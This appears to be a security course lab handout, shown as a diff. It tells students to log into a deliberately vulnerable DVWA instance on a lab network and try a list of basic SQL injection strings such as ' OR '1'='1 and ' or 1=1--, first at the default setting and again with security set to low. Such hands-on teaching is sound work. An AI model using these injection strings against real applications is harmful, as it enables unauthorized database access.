@@ -1,0 +1,78 @@
+ Go to one the following webpages
+
+from your contoso01 lab windows 10 box
+
+
+http://10.192.20.101/dvwa/login.php
+
+http://10.192.20.101/dvwa/login.php
+
+
+
+log in with the following information
+
+username admin
+
+password password
+
+SELECT the
+
+SQL Injection link on the left menu
+
+
+
+Try a few of the commands below and annotate your results.
+
+
+
+' OR '1'='1
+
+1=1--
+
+' or 'a'='a
+
+ ' or 1=1--
+
+" or 1=1--
+
+or 1=1--
+
+' or 'a'='a
+
+" or "a"="a
+
+' OR '1'='1
+
+1=1--
+
+' or 'a'='a
+
+ ' or 1=1--
+
+" or 1=1--
+
+or 1=1--
+
+' or 'a'='a
+
+" or "a"="a
+
+') or ('a'='a
+
+
+
+Now CLICK the SETUP from the menu on the left
+
+THEN Select Create\reset database
+
+Then select DWVA Security from the menu on the left.
+
+set it to low
+
+go back to the SQL Injection and try the commands again and annote your results. 
+
+
+
+Upload your findings in this assignment
+
+then go back
